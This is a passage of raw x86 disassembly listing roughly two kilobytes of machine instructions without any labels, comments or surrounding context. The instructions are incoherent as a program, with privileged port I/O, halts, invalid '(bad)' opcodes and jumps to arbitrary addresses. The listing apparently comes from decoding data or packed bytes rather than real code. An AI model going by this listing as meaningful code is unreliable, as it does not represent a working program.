  413f42:	sbb    DWORD PTR [edx],ebp
  413f44:	rcr    BYTE PTR [edi+eax*8-0x1ea1315],cl
  413f4b:	daa    
  413f4c:	xor    ebx,eax
  413f4e:	test   esp,ebp
  413f50:	mov    bl,0x8e
  413f52:	add    edi,esp
  413f54:	aam    0x3a
  413f56:	pop    esi
  413f57:	stc    
  413f58:	cmp    BYTE PTR [ecx-0x7],dl
  413f5b:	add    BYTE PTR [edi-0x4efc0e23],dl
  413f61:	in     al,dx
  413f62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f63:	cmp    ebx,DWORD PTR [edi+0x7e2c067b]
  413f69:	and    edx,DWORD PTR [eax+0x5630856f]
  413f6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f70:	add    al,BYTE PTR [ebp-0x41]
  413f73:	inc    ecx
  413f74:	stos   BYTE PTR es:[edi],al
  413f75:	sub    DWORD PTR [eax+edi*4+0x4c4271a],eax
  413f7c:	jnp    0x413f43
  413f7e:	mov    dl,BYTE PTR [eax]
  413f80:	mov    ds:0xe226cf9a,eax
  413f85:	imul   ebx,DWORD PTR [edx+0x34],0xc6c6a004
  413f8c:	inc    esi
  413f8d:	jmp    0x413f9a
  413f8f:	jp     0x413f74
  413f91:	sbb    bh,BYTE PTR [ebx+0x24]
  413f94:	int3   
  413f95:	jle    0x413f20
  413f97:	ret    0x997c
  413f9a:	mov    eax,ds:0x2e38a43c
  413f9f:	fdivr  st(2),st
  413fa1:	mov    bh,0x16
  413fa3:	jae    0x413fe7
  413fa5:	xchg   BYTE PTR [ecx-0x1bb44519],ch
  413fab:	out    dx,eax
  413fac:	mov    cl,0xe2
  413fae:	into   
  413faf:	xchg   ecx,eax
  413fb0:	cmc    
  413fb1:	and    edx,ebp
  413fb3:	fisttp QWORD PTR [edx+0x1fb4924c]
  413fb9:	jmp    0x1b6cec2
  413fbe:	bound  ebp,QWORD PTR [ebp+0x57]
  413fc1:	mov    ds:0x4d7fd756,eax
  413fc6:	jle    0x413fc0
  413fc8:	(bad)  
  413fc9:	std    
  413fca:	xor    ah,BYTE PTR [ecx-0x35]
  413fcd:	(bad)  
  413fcf:	(bad)  
  413fd0:	cmp    BYTE PTR [esi+0x67],ah
  413fd3:	std    
  413fd4:	and    edx,DWORD PTR ds:0x602be607
  413fda:	in     al,dx
  413fdb:	jns    0x414005
  413fdd:	mov    ecx,0xd54e4842
  413fe2:	xchg   DWORD PTR [eax-0x533055b3],ebp
  413fe8:	test   eax,0xa1be2dea
  413fed:	popa   
  413fee:	fild   DWORD PTR [edi+0x16dc8eb9]
  413ff4:	jg     0x413fdd
  413ff6:	int    0x9e
  413ff8:	imul   eax,DWORD PTR [eax+eiz*4],0x75
  413ffc:	xor    DWORD PTR [esi-0x54],0x46
  414000:	xor    eax,0x2a77aa20
  414005:	aaa    
  414006:	out    dx,al
  414007:	div    BYTE PTR [edx-0x77]
  41400a:	push   ss
  41400b:	jns    0x413f9c
  41400d:	mov    eax,ds:0x464b8505
  414012:	mov    dh,0xbf
  414014:	fisttp WORD PTR ds:0x1b22af9c
  41401a:	or     eax,0x4e5ff454
  41401f:	push   edx
  414020:	xor    DWORD PTR [edi+0x2c],ebp
  414023:	xor    ch,BYTE PTR [eax+0x31]
  414026:	jp     0x413fba
  414028:	cld    
  414029:	jno    0x41408e
  41402b:	pop    esi
  41402c:	cld    
  41402d:	lahf   
  41402e:	arpl   WORD PTR [edi-0x19],dx
  414031:	lock call 0xe3d4:0xd9cc7402
  414039:	jp     0xdff582e3
  41403f:	add    BYTE PTR [esi+eax*4+0x5ea59b7a],0x66
  414047:	add    DWORD PTR [eax+esi*8-0x73],ebx
  41404b:	popf   
  41404c:	inc    ebx
  41404d:	lds    esi,FWORD PTR [esi+ebx*2+0x2b]
  414051:	push   ss
  414052:	stc    
  414053:	adc    BYTE PTR [eax],0x15
  414056:	fsubr  QWORD PTR gs:[ecx]
  414059:	jb     0x414035
  41405b:	pop    esi
  41405c:	mov    ecx,0xe05336d2
  414061:	xchg   ecx,eax
  414062:	shl    BYTE PTR [ebp+0x6a],cl
  414065:	and    DWORD PTR [edx+0x77],ebp
  414068:	or     eax,0x2b2ec8b4
  41406d:	lods   eax,DWORD PTR ds:[esi]
  41406e:	sbb    BYTE PTR [ecx+0x390295e4],dl
  414074:	sbb    ecx,edx
  414076:	mov    dh,BYTE PTR [eax-0x16]
  414079:	scas   eax,DWORD PTR es:[edi]
  41407a:	idiv   BYTE PTR [ebx]
  41407c:	(bad)  
  41407d:	fist   DWORD PTR [ebx+0x13]
  414080:	adc    esi,0x48
  414083:	cmp    al,0xe3
  414085:	or     eax,0x37b44a91
  41408a:	pop    ebp
  41408b:	mov    ah,0xc8
  41408d:	mov    ebx,0x90288469
  414092:	jne    0x414035
  414094:	hlt    
  414095:	sahf   
  414096:	adc    al,0x38
  414098:	out    dx,eax
  414099:	pop    edx
  41409a:	lods   eax,DWORD PTR ds:[esi]
  41409b:	sar    al,0xaa
  41409e:	mov    ebp,0x820174b1
  4140a3:	ret    
  4140a4:	pop    es
  4140a5:	push   eax
  4140a6:	cmp    eax,0xf6c67ecb
  4140ab:	in     eax,0x93
  4140ad:	sub    DWORD PTR [ebp+0x1d],edx
  4140b0:	mov    al,ds:0x806e3c83
  4140b5:	push   ebx
  4140b6:	jns    0x4140ee
  4140b8:	jne    0x4140bb
  4140ba:	cmp    DWORD PTR [eax+0xc],eax
  4140bd:	inc    esi
  4140be:	fs pop eax
  4140c0:	adc    esp,ecx
  4140c2:	mov    ebp,0xaa9663b
  4140c7:	mov    cl,0x7c
  4140c9:	pop    ds
  4140ca:	int3   
  4140cb:	(bad)  
  4140cc:	iret   
  4140cd:	cmc    
  4140ce:	push   esp
  4140cf:	scas   al,BYTE PTR es:[edi]
  4140d0:	xor    al,0xa4
  4140d2:	xor    BYTE PTR [ecx+0x48],dh
  4140d5:	sti    
  4140d6:	mov    bl,0xec
  4140d8:	mov    edx,0x496a5ddd
  4140dd:	ds and al,0xd6
  4140e0:	cld    
  4140e1:	dec    ebp
  4140e2:	sbb    bl,BYTE PTR [ecx+0x375f21e]
  4140e8:	and    eax,0x3d828427
  4140ed:	mov    al,0x99
  4140ef:	hlt    
  4140f0:	sbb    esi,DWORD PTR [esi-0x69]
  4140f3:	and    eax,0x1063dd7f
  4140f8:	cwde   
  4140f9:	mov    ds:0x3096d5f6,eax
  4140fe:	jb     0x4140ab
  414100:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414101:	out    0xb4,eax
  414103:	mov    ebx,0x670c9008
  414108:	push   esi
  414109:	and    DWORD PTR [ebx-0x4b],0xffffffd6
  41410d:	sahf   
  41410e:	loopne 0x41410b
  414110:	scas   eax,DWORD PTR es:[edi]
  414111:	std    
  414112:	mov    ?,WORD PTR [esi+esi*8-0x7a]
  414116:	(bad)  
  414117:	fidivr WORD PTR [eax]
  414119:	pop    ebp
  41411a:	pop    eax
  41411b:	cdq    
  41411c:	fimul  DWORD PTR [ecx-0x76]
  41411f:	and    al,0x7a
  414121:	push   esp
  414122:	cmp    al,0xaf
  414124:	dec    edi
  414125:	stos   BYTE PTR es:[edi],al
  414126:	in     al,dx
  414127:	fldz   
  414129:	in     al,0x9d
  41412b:	xchg   esp,eax
  41412c:	js     0x4140c3
  41412e:	add    edx,edi
  414130:	pop    ss
  414131:	jne    0x41415a
  414133:	lods   eax,DWORD PTR ds:[esi]
  414134:	sub    ecx,DWORD PTR [ecx+0x72]
  414137:	loope  0x414192
  414139:	xor    ah,BYTE PTR [eax+0x19ebde05]
  41413f:	sahf   
  414140:	mov    ds:0x5eb259c8,al
  414145:	xchg   BYTE PTR [eax-0x16],dl
  414148:	and    eax,edi
  41414a:	scas   eax,DWORD PTR es:[edi]
  41414b:	(bad)  [edx+0x12]
  41414e:	out    0x6a,eax
  414150:	or     DWORD PTR [edx+0x0],esi
  414153:	aas    
  414154:	jge    0x414112
  414156:	push   cs
  414157:	xor    cl,BYTE PTR [esi-0x307d3a71]
  41415d:	xor    eax,0x7c58fc9b
  414162:	pop    edx
  414163:	inc    esp
  414164:	clc    
  414165:	loope  0x41416c
  414167:	out    dx,al
  414168:	push   esi
  414169:	test   BYTE PTR [esi+ebx*1-0x35],0x51
  41416e:	mov    eax,ds:0x48bddcb0
  414173:	data16 sti 
  414175:	dec    eax
  414176:	sbb    ah,bl
  414178:	test   DWORD PTR [edi-0x1f102d6c],0x67608b72
  414182:	xchg   esp,eax
  414183:	or     eax,0xff38b725
  414188:	test   eax,0xd14e91ba
  41418d:	pop    ebx
  41418e:	adc    esi,edx
  414190:	mov    ecx,0x92d527f3
  414195:	push   ebx
  414196:	daa    
  414197:	fst    DWORD PTR [ebp-0x1c44e90c]
  41419d:	adc    DWORD PTR [esi+0x54],ecx
  4141a0:	sahf   
  4141a1:	mov    cl,0x85
  4141a4:	xor    ebp,ebx
  4141a6:	adc    al,0xfd
  4141a8:	fmul   QWORD PTR [ecx+eiz*8]
  4141ab:	rcl    DWORD PTR [edx-0x3a],1
  4141ae:	lds    ebp,FWORD PTR [edi-0x72]
  4141b1:	jl     0x4141a2
  4141b3:	ret    0xc5c5
  4141b6:	jb     0x414213
  4141b8:	jp     0x41414b
  4141ba:	push   eax
  4141bb:	mov    eax,ds:0x6a623518
  4141c0:	dec    ebp
  4141c1:	loop   0x414185
  4141c3:	mov    ecx,0x9ef819a0
  4141c8:	out    dx,eax
  4141c9:	das    
  4141ca:	call   0xfa2e1b90
  4141cf:	std    
  4141d0:	jne    0x4141a6
  4141d2:	mov    cl,0x43
  4141d4:	fcmovu st,st(7)
  4141d6:	push   es
  4141d7:	(bad)  
  4141d9:	push   eax
  4141da:	les    edx,FWORD PTR [esi+ecx*4+0x3b0ef81]
  4141e1:	enter  0xaf8a,0xaf
  4141e5:	stos   BYTE PTR es:[edi],al
  4141e6:	xchg   edi,eax
  4141e7:	stos   BYTE PTR es:[edi],al
  4141e8:	out    0x60,al
  4141ea:	mov    al,ds:0xc9143f8b
  4141ef:	aas    
  4141f0:	int    0x1f
  4141f2:	sub    eax,0x7ed46a41
  4141f7:	add    al,0x5a
  4141f9:	push   esp
  4141fa:	out    dx,al
  4141fb:	leave  
  4141fc:	aam    0x45
  4141fe:	dec    ebx
  4141ff:	sub    al,0x31
  414201:	popa   
  414202:	(bad)
  414206:	xchg   ebx,eax
  414207:	inc    edi
  414208:	jns    0x414272
  41420a:	xchg   esi,eax
  41420b:	sub    al,dl
  41420d:	inc    ebp
  41420e:	pop    ss
  41420f:	iret   
  414210:	mov    ecx,0xa104cb55
  414215:	(bad)  
  414216:	call   0x1f2e299f
  41421b:	fbstp  TBYTE PTR [ebx]
  41421d:	pop    ss
  41421e:	and    ah,BYTE PTR [ebx]
  414220:	mov    al,0x5
  414222:	or     cl,ah
  414224:	or     eax,0x5d16c959
  414229:	cmp    al,0xd0
  41422b:	bnd jge 0x41422f
  41422e:	neg    DWORD PTR [ecx+0x6735fadb]
  414234:	and    BYTE PTR [ecx],cl
  414236:	out    0xc5,eax
  414238:	test   BYTE PTR [esi-0x2f996309],0x64
  41423f:	inc    edi
  414240:	pop    esp
  414241:	and    edx,DWORD PTR [edi+0x42]
  414244:	daa    
  414245:	xchg   BYTE PTR [edx+0x6c],al
  414248:	pop    ds
  414249:	or     BYTE PTR [ecx-0x3f823da8],bh
  41424f:	dec    ecx
  414250:	dec    edx
  414251:	push   cs
  414252:	loop   0x4141ec
  414254:	fmul   QWORD PTR [ebx+0x7dfdfac0]
  41425a:	adc    BYTE PTR [eax+0x42d1c702],ch
  414260:	or     edi,DWORD PTR [ebx-0x2f426973]
  414266:	mov    ebx,0xb9edd186
  41426b:	pop    ebp
  41426c:	push   cs
  41426d:	sub    esi,DWORD PTR [ebp+0x551ea596]
  414273:	dec    ebp
  414274:	inc    edx
  414275:	nop
  414276:	mov    ah,0xc3
  414278:	bound  eax,QWORD PTR [esi+eiz*4+0x15]
  41427c:	leave  
  41427d:	or     BYTE PTR [ebx],ch
  41427f:	imul   ecx,DWORD PTR [edi+0x6001e06c],0x3b
  414286:	scas   eax,DWORD PTR es:[edi]
  414287:	fadd   DWORD PTR [edi+eax*1]
  41428a:	push   cs
  41428b:	out    dx,eax
  41428c:	int3   
  41428d:	jo     0x414254
  41428f:	pop    ebp
  414290:	(bad)  
  414291:	push   0x130f526c
  414296:	dec    ecx
  414297:	hlt    
  414298:	rcl    BYTE PTR fs:[esi+eiz*4],1
  41429c:	push   ebx
  41429d:	jl     0x414233
  41429f:	sbb    eax,0x29fb4cba
  4142a4:	(bad)  
  4142a5:	sbb    DWORD PTR [ebx+0x1d2a8de1],edx
  4142ab:	ins    DWORD PTR es:[edi],dx
  4142ac:	mov    esp,0x13d2808c
  4142b1:	xor    dh,BYTE PTR ds:0xd9c4535
  4142b7:	mov    esp,0xc1ffe35c
  4142bc:	pusha  
  4142bd:	adc    BYTE PTR [ebx+edi*8-0x1fa7e043],al
  4142c4:	cs sub eax,0x9c97794
  4142ca:	(bad)  
  4142cb:	xchg   esp,eax
  4142cc:	dec    eax
  4142cd:	xor    ebx,DWORD PTR ds:0xc072b26e
  4142d3:	sahf   
  4142d4:	sbb    DWORD PTR [edx-0x5ef36b06],ebp
  4142da:	outs   dx,BYTE PTR ds:[esi]
  4142db:	mov    ebp,0xb77f64f3
  4142e0:	int3   
  4142e1:	das    
  4142e2:	cdq    
  4142e3:	(bad)  
  4142e4:	in     al,0x1f
  4142e6:	dec    edi
  4142e7:	jb     0x414323
  4142e9:	cdq    
  4142ea:	sti    
  4142eb:	jns    0x4142e6
  4142ed:	xchg   edx,eax
  4142ee:	aad    0xb3
  4142f0:	push   esi
  4142f1:	iret   
  4142f2:	imul   ebx,DWORD PTR [esi+ebp*2],0xfffffffe
  4142f6:	aas    
  4142f7:	pop    eax
  4142f8:	(bad)  
  4142f9:	js     0x414329
  4142fb:	inc    ecx
  4142fc:	push   ebx
  4142fd:	pusha  
  4142fe:	mov    al,0xaa
  414300:	ret    
  414301:	xor    esp,DWORD PTR [ecx+ebx*1-0x1e535927]
  414308:	inc    esi
  414309:	bound  ebx,QWORD PTR [eax+0x7c68fe4c]
  41430f:	fwait
  414310:	jns    0x41430e
  414312:	rcr    DWORD PTR [ebx],cl
  414314:	mov    dl,0xc
  414316:	add    ah,BYTE PTR [eax-0x57]
  414319:	bound  esi,QWORD PTR [ecx]
  41431b:	add    al,0xa2
  41431d:	imul   ebp,DWORD PTR [ebx+0x43110031],0xfffffffd
  414324:	pop    ebp
  414325:	dec    esi
  414326:	mov    ebp,0x6dbbb921
  41432b:	and    edx,esi
  41432d:	je     0x41437e
  41432f:	jne    0x414366
  414331:	adc    ebp,eax
  414333:	cwde   
  414334:	sti    
  414335:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414336:	sub    al,dh
  414338:	lock leave 
  41433a:	test   al,0x91
  41433c:	popf   
  41433d:	out    dx,eax
  41433e:	cdq    
  41433f:	xchg   ebx,edi
  414341:	cmp    al,0x82
  414343:	repnz push esi
  414345:	xchg   edi,eax
  414346:	cmp    al,dh
  414348:	cmp    eax,0x8cad1fef
  41434d:	ret    
  41434e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41434f:	shl    BYTE PTR [esi-0x74],1
  414352:	popf   
  414353:	mov    bl,0x96
  414355:	mov    ah,0x51
  414357:	jbe    0x41437e
  414359:	jnp    0x414340
  41435b:	pop    esi
  41435c:	adc    ch,BYTE PTR [eax]
  41435e:	sbb    dh,0xf5
  414361:	jg     0x4142f5
  414363:	jnp    0x414333
  414365:	sti    
  414366:	xchg   esp,eax
  414367:	popf   
  414368:	sbb    al,0x7
  41436a:	or     ah,BYTE PTR [eax+0x3646a4d0]
  414370:	test   DWORD PTR [ecx-0x45],edx
  414373:	mov    bl,0x32
  414375:	jecxz  0x414376
  414377:	stos   DWORD PTR es:[edi],eax
  414378:	in     al,dx
  414379:	xchg   edi,eax
  41437a:	mov    bh,0x5
  41437c:	mov    eax,0x82ca0a5e
  414381:	jmp    0x414370
  414383:	loope  0x4143b9
  414385:	inc    esi
  414386:	inc    ebx
  414387:	dec    esp
  414388:	cld    
  414389:	shl    DWORD PTR [ecx-0x4de39bde],cl
  41438f:	push   eax
  414390:	bound  esp,QWORD PTR [ecx+0x13]
  414393:	lock sub al,0xec
  414396:	cs jns 0x414365
  414399:	aas    
  41439a:	and    al,0x60
  41439c:	iret   
  41439d:	and    ah,BYTE PTR [ebp+0x22]
  4143a0:	das    
  4143a1:	cmp    al,0x81
  4143a3:	(bad)  
  4143a5:	in     eax,0x6d
  4143a7:	fist   WORD PTR [ecx]
  4143a9:	push   0x35ad9e00
  4143ae:	je     0x4143be
  4143b0:	add    DWORD PTR ds:0xd5e8b7e,ebx
  4143b6:	mov    esi,0x97cae285
  4143bb:	(bad)  
  4143bc:	in     al,dx
  4143bd:	aaa    
  4143be:	adc    BYTE PTR [eax-0x61],bl
  4143c1:	adc    cl,BYTE PTR [ecx]
  4143c3:	call   0x27719e2d
  4143c8:	push   ecx
  4143c9:	jne    0x414380
  4143cb:	arpl   WORD PTR [edx-0x4d],di
  4143ce:	inc    edi
  4143cf:	mov    ecx,0x58a1b8cb
  4143d4:	sub    eax,esi
  4143d6:	cdq    
  4143d7:	xor    al,0x70
  4143d9:	pop    ss
  4143da:	fld    DWORD PTR [edx]
  4143dc:	pushf  
  4143dd:	retf   0x87c
  4143e0:	push   es
  4143e1:	adc    cl,bl
  4143e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143e4:	loop   0x414375
  4143e6:	fstp   TBYTE PTR [ebx]
  4143e8:	call   0xd563b785
  4143ed:	sbb    al,BYTE PTR [ebp-0x420141ae]
  4143f3:	jecxz  0x41446e
  4143f5:	loope  0x4143fd
  4143f7:	push   ss
  4143f8:	jo     0x4143da
  4143fa:	imul   ebp,DWORD PTR [esp+ecx*1-0x25],0x89a7c1fa
  414402:	sub    DWORD PTR [edx+0x19],eax
  414405:	ins    BYTE PTR es:[edi],dx
  414406:	mov    ds:0xf58a508c,eax
  41440b:	sbb    eax,0x89811a00
  414410:	xchg   edx,eax
  414411:	jp     0x4143a2
  414413:	or     al,0x2
  414415:	fld    DWORD PTR [ecx-0x649f0485]
  41441b:	pop    ecx
  41441c:	and    al,0xb9
  41441e:	mul    BYTE PTR [ebx]
  414420:	sub    BYTE PTR [edi+0x6b],ch
  414423:	pop    ds
  414424:	not    DWORD PTR [ecx+ebp*2+0x4840d24c]
  41442b:	data16 adc BYTE PTR [edi+edi*2],bl
  41442f:	scas   al,BYTE PTR es:[edi]
  414430:	or     cl,BYTE PTR [edi]
  414432:	or     DWORD PTR [edi+0x3f],eax
  414435:	popa   
  414436:	or     DWORD PTR [ecx],esi
  414438:	jge    0x4143ea
  41443a:	cmp    al,0x10
  41443c:	shr    ecx,0xd0
  41443f:	ss into 
  414441:	popf   
  414442:	mov    eax,ds:0x7deb31fc
  414447:	sbb    ah,BYTE PTR [ebx]
  414449:	enter  0xf153,0xf8
  41444d:	lea    edi,[edi-0x69]
  414450:	out    0xe7,al
  414452:	fidiv  WORD PTR [ebx]
  414454:	adc    ebp,esp
  414456:	inc    ebx
  414457:	cmp    al,0x1a
  414459:	leave  
  41445a:	fdiv   DWORD PTR ds:0x6f8bfd58
  414460:	pop    ds
  414461:	jo     0x414452
  414463:	pop    ebx
  414464:	shr    al,cl
  414466:	push   0x40
  414468:	shl    BYTE PTR [edx+edi*1-0x22],0xab
  41446d:	in     eax,0x43
  41446f:	and    eax,0x670cae0b
  414474:	loope  0x41445a
  414476:	mov    DWORD PTR [eax+eiz*1],edx
  414479:	and    ecx,DWORD PTR [esi+0x39]
  41447c:	add    esp,eax
  41447e:	and    DWORD PTR [edi-0x77],0xfffffffb
  414482:	or     eax,0xc456ff88
  414487:	fcos   
  414489:	jmp    0x4144ee
  41448b:	inc    DWORD PTR [ecx+ebx*2]
  41448e:	aad    0x93
  414490:	xor    al,0x2a
  414492:	test   eax,0x6e9c5cd8
  414497:	mov    ah,0x42
  414499:	mov    dh,0xf1
  41449b:	out    dx,eax
  41449c:	mov    esp,0x2b763791
  4144a1:	rcr    bl,1
  4144a3:	ficomp DWORD PTR ds:0x50de7676
  4144a9:	push   0xffffffd4
  4144ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144ac:	sahf   
  4144ad:	xchg   esi,eax
  4144ae:	mov    eax,ds:0xa5637b18
  4144b3:	xor    DWORD PTR [ebx],ebp
  4144b5:	and    DWORD PTR [ebx+0x334bf4f1],0x63cd9976
  4144bf:	das    
  4144c0:	pop    es
  4144c1:	xchg   edi,eax
  4144c2:	mov    cs,ebx
  4144c4:	cld    
  4144c5:	mov    ch,0x56
  4144c7:	aam    0x57
  4144c9:	(bad)  
  4144ca:	lock mov DWORD PTR [edi],edx
  4144cd:	lea    esi,[ebp+0x2229cca6]
  4144d3:	mov    bl,0xc2
  4144d5:	add    eax,0x9d3b6166
  4144da:	cmp    ebp,DWORD PTR [esi]
  4144dc:	mov    ch,0x67
  4144de:	repnz adc al,0xc2
  4144e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144e2:	(bad)  
  4144e3:	fcmovb st,st(1)
  4144e5:	inc    esi
  4144e6:	fsubr  st(2),st
  4144e8:	mov    ss,WORD PTR [eax-0x29e5a9f2]
  4144ee:	mov    dh,0x41
  4144f0:	sbb    al,BYTE PTR [eax-0x1bbc4b6]
  4144f6:	std    
  4144f7:	mov    es,WORD PTR ds:0xb928a347
  4144fd:	loopne 0x4144db
  4144ff:	xchg   BYTE PTR [eax],ah
  414501:	cs push 0xffffffa9
  414504:	xor    al,0x42
  414506:	mov    ch,0xe8
  414508:	call   0xafd:0xd0ace928
  41450f:	es inc eax
  414511:	test   eax,0x8710194
  414516:	aaa    
  414517:	inc    eax
  414519:	shr    dl,cl
  41451b:	sahf   
  41451c:	repnz and dl,cl
  41451f:	ins    BYTE PTR es:[edi],dx
  414520:	ja     0x41454d
  414522:	adc    al,0x7a
  414524:	mov    al,ds:0xba2536a6
  414529:	data16 xor BYTE PTR [edx],ah
  41452c:	and    ebp,DWORD PTR [edi]
  41452e:	dec    edx
  41452f:	xchg   DWORD PTR [edx],eax
  414531:	(bad)  
  414532:	mov    ds:0xcae3dae8,al
  414537:	add    al,0xaf
  414539:	(bad)  
  41453a:	hlt    
  41453b:	push   esi
  41453c:	call   0x7134:0x12be8602
  414543:	pop    es
  414544:	inc    edi
  414545:	sub    BYTE PTR [ecx-0x8c91c05],bh
  41454b:	xor    DWORD PTR [ebp+0x75],eax
  41454e:	cdq    
  41454f:	jge    0x4145c7
  414551:	inc    ebp
  414552:	pushf  
  414553:	and    edi,eax
  414555:	xchg   ecx,eax
  414556:	mov    ah,BYTE PTR [eax+edi*4]
  414559:	inc    ecx
  41455a:	cmp    eax,0x1cc83d31
  41455f:	pop    ecx
  414560:	mov    cs,WORD PTR [edi+0xd1e6bad]
  414566:	push   ebx
  414567:	mov    ebp,0xcd719d55
  41456c:	push   esp
  41456d:	test   al,0xec
  41456f:	xor    al,0xff
  414571:	mov    cl,0x4d
  414573:	push   es
  414574:	(bad)  
  414575:	adc    edi,DWORD PTR [edx]
  414577:	dec    eax
  414578:	cmp    cl,dl
  41457a:	cmp    esp,ecx
  41457c:	ss and eax,0xef69c8a3
  414582:	call   0x4b453bc1
  414587:	ror    DWORD PTR [esp+edx*8],cl
  41458a:	int3   
  41458b:	cmp    al,0x28
  41458d:	mov    bl,0x86
  41458f:	stos   DWORD PTR es:[edi],eax
  414590:	scas   eax,DWORD PTR es:[edi]
  414591:	test   dh,cl
  414593:	aaa    
  414594:	jl     0x414596
  414596:	sub    esi,ebx
  414598:	lahf   
  414599:	push   cs
  41459a:	mov    WORD PTR [eax],?
  41459c:	repnz inc eax
  41459e:	adc    BYTE PTR [ecx-0x4e],dh
  4145a1:	in     al,dx
  4145a2:	mov    WORD PTR [ebp+0x1b2d1f4d],ds
  4145a8:	or     BYTE PTR [eax-0x269ea5d6],dl
  4145ae:	pop    ebx
  4145af:	cmp    ebx,DWORD PTR [ebp-0x1a6bda0f]
  4145b5:	imul   ecx,DWORD PTR [ecx+ebp*1],0xd481d5df
  4145bc:	mov    DWORD PTR [ebx*1+0x22a72b9],ecx
  4145c3:	dec    al
  4145c5:	cmp    al,0x68
  4145c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145c8:	pusha  
  4145c9:	stos   DWORD PTR es:[edi],eax
  4145ca:	dec    esi
  4145cb:	push   cs
  4145cc:	out    0x19,al
  4145ce:	rcl    BYTE PTR [ebx-0x5bc3c928],0xf5
  4145d5:	pop    ds
  4145d6:	xchg   esp,eax
  4145d7:	xor    eax,eax
  4145d9:	(bad)  
  4145db:	or     bl,BYTE PTR [ebx]
  4145dd:	or     al,0x29
  4145df:	adc    eax,0x2a8c8fe5
  4145e4:	repz xor ch,BYTE PTR [esi-0xfec52d]
  4145eb:	jg     0x4145d4
  4145ed:	mov    ds:0xba0c833f,al
  4145f2:	sub    eax,0x5e7a4a20
  4145f7:	mov    cs,eax
  4145f9:	mov    edx,0xb5417461
  4145fe:	add    eax,0xca14abe5
  414603:	aam    0x99
  414605:	jae    0x41458e
  414607:	mov    edx,0x6bf69c4f
  41460c:	ins    BYTE PTR es:[edi],dx
  41460d:	aaa    
  41460e:	shr    DWORD PTR [edi+0x604c6d9],1
  414614:	ret    0xb0db
  414617:	int3   
  414618:	int    0xb5
  41461a:	mov    dh,BYTE PTR ds:0x51d97894
  414620:	xor    esi,DWORD PTR [edi+0x69]
  414623:	sahf   
  414624:	enter  0xa711,0x4f
  414628:	out    dx,eax
  414629:	sub    BYTE PTR [ebx-0x3b],al
  41462c:	pop    es
  41462d:	clc    
  41462e:	push   esp
  41462f:	add    ebx,DWORD PTR [ebp-0x3a]
  414632:	cmc    
  414633:	shl    bl,0x6d
  414636:	sub    BYTE PTR [edx+0x2c01a96d],bl
  41463c:	ret    0xf712
  41463f:	js     0x4145c7
  414641:	loope  0x4146ac
  414643:	aam    0x85
  414645:	jg     0x4145f0
  414647:	xor    ch,BYTE PTR [ebp+ebx*2+0x406d8f2b]
  41464e:	and    DWORD PTR [edx],ebx
  414650:	(bad)  
  414651:	loop   0x414658
  414653:	iret   
  414654:	clc    
  414655:	in     eax,0xa1
  414657:	iret   
  414658:	jno    0x414618
  41465a:	cmp    BYTE PTR [edx+0x7b215753],cl
  414660:	test   BYTE PTR [esi+0x68],dl
  414663:	adc    esp,DWORD PTR [esi-0x42]
  414666:	pop    esi
  414667:	push   eax
  414668:	sti    
  414669:	xchg   esp,eax
  41466a:	neg    DWORD PTR ds:0x239596ae
  414670:	int    0x1c
  414672:	mov    WORD PTR ds:0x2ea2676b,?
  414678:	fstp   TBYTE PTR [esi+ebp*4+0x39]
  41467c:	xor    ebx,eax
  41467e:	jp     0x414612
  414680:	adc    eax,DWORD PTR [ecx+0x24f6465c]
  414686:	(bad)  
  414687:	arpl   si,bx
  414689:	adc    BYTE PTR [edx],dl
  41468b:	pop    ds
  41468c:	push   ds
  41468d:	sbb    bl,bl
  41468f:	pop    edi
  414690:	enter  0x8971,0x24
  414694:	outs   dx,BYTE PTR ds:[esi]
  414695:	sbb    ch,bl
  414697:	sti    
  414698:	adc    al,0xed
  41469a:	push   eax
  41469b:	lahf   
  41469c:	cmp    edx,DWORD PTR [ebx+eax*8-0x77]
  4146a0:	imul   esp,DWORD PTR [ebp-0x45628a2b],0x96094bfb
  4146aa:	out    0xcc,ax
  4146ad:	and    DWORD PTR [ebx-0x42],ebp
  4146b0:	gs inc esi
  4146b2:	shr    DWORD PTR [esi-0x5b3d16f2],cl
  4146b8:	ret    0x2e34
  4146bb:	xor    esi,DWORD PTR [esi+0x24]
  4146be:	xchg   ebx,eax
  4146bf:	xchg   ecx,eax
  4146c0:	and    al,0x5a
  4146c2:	sub    bl,BYTE PTR [edx+eax*2]
  4146c5:	xchg   al,dh
  4146c7:	xor    al,0x81
  4146c9:	gs jle 0x414650
  4146cc:	mov    ecx,ebp
  4146ce:	jo     0x414657
  4146d0:	pop    ebx
  4146d1:	sub    al,0xff
  4146d3:	sbb    eax,0x124036c7
  4146d8:	mov    dh,0x98
  4146da:	mov    ah,0xf3
  4146dc:	sbb    esi,esp
  4146de:	pop    ebp
  4146df:	sub    BYTE PTR [esi+0x6b],al
  4146e2:	retf   0x484d
  4146e5:	pop    es
  4146e6:	push   ss
  4146e7:	fsub   DWORD PTR [edx+0x47]
  4146ea:	(bad)  
  4146eb:	mov    eax,0x409b900c
  4146f0:	jne    0x414697
  4146f2:	call   0x15c4a341
  4146f7:	inc    esi
  4146f8:	repz pop ss
  4146fa:	sbb    bl,bl
  4146fc:	cli    
  4146fd:	out    0x92,al
  4146ff:	sub    eax,DWORD PTR [ebx]
  414701:	cmp    al,0x61
  414703:	jb     0x414760
  414705:	lds    eax,FWORD PTR [esi]
  414707:	push   0x4cffa53d
  41470c:	in     eax,0xf2
  41470e:	xchg   al,dh
  414710:	cld    
  414711:	fnstsw WORD PTR [esi-0x37]
  414714:	mov    ds:0x89f97a9a,eax
  414719:	arpl   WORD PTR [eax-0x43c6d162],bx
  41471f:	ret    0xff9c
  414722:	mov    esp,0xe6bee4de
  414727:	add    bh,BYTE PTR [ebp+esi*1-0x2c]
  41472b:	sbb    ebx,DWORD PTR [edi+0x5]
  41472e:	jmp    0x4146eb
  414730:	enter  0xa05,0x1f
  414734:	std    
  414735:	push   edi
  414736:	jecxz  0x4146bd
  414738:	mov    cl,0xf3
  41473a:	daa    
  41473b:	and    eax,0x8a380270
